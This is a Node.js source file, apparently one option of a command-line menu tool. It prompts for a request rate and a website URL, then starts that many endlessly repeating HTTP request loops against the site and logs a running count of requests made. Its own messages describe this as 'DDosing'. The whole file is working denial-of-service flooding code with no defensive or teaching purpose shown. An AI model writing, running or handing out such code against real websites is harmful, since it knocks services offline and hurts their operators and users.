//Dependencies
const Debugger = require("./utils/debugger.js")
const Request = require("request")
const Delay = require("delay")

//Variables
var Is_End = false
var requests = 0

//Functions
async function Initiate_A_Requester(wu){
    await Delay(100)

    if(Is_End){
        return
    }

    Request(wu, function(err, res, body){
        if(err){
            Initiate_A_Requester(wu)
            return
        }

        requests += 1
        Initiate_A_Requester(wu)
        return
    })
}

//Main
function self(ReadLine, bf, callback){
    var callback_data = {
        cli_path: ""
    }

    ReadLine.question("Request per seconds|Website url: ", stuff =>{
        if(stuff == ""){
            Debugger.debug("ERROR", "Invalid request per seconds/website url.")

            Debugger.debug("INFO", "Going back to the menu, please wait.")
            setTimeout(function(){
                callback_data.cli_path = "/home"
                    
                callback(callback_data)
            }, 1000)
            return
        }else{
            const rps = stuff.split("|")[0]
            const wu = stuff.split("|")[1]

            Request(wu, function(err, res, body){
                if(err){
                    Debugger.debug("ERROR", "Invalid website url.")

                    Debugger.debug("INFO", "Going back to the menu, please wait.")
                    setTimeout(function(){
                        callback_data.cli_path = "/home"
                            
                        callback(callback_data)
                    }, 1000)
                    return
                }

                for( i = 0; i <= rps; i++ ){
                    Initiate_A_Requester(wu)
                }
    
                const ST = setInterval(function(){
                    Debugger.debug("INFO", `${requests} requests have been made.`)
                }, 1000)
    
                ReadLine.question("Press enter to stop & go back to the menu", waiter =>{
                    clearInterval(ST)
                    Is_End = true
    
                    Debugger.debug("INFO", "DDosing have been stopped.")
                    Debugger.debug("INFO", "Going back to the menu, please wait.")
                    setTimeout(function(){
                        callback_data.cli_path = "/home"
                        console.clear()
                        
                        callback(callback_data)
                    }, 2500)
                })
                console.log("")
            })
        }
    })
}

//Exporter
module.exports = {
    self: self
}